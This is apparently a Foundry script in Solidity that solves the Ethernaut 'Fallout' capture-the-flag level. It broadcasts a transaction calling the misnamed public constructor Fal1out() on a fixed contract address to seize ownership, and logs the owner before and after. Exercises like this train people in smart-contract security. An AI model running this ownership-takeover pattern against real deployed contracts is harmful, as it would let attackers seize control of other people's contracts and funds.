// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0x7e428B417954beabD3FA0756aB3377056a8a12e7);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}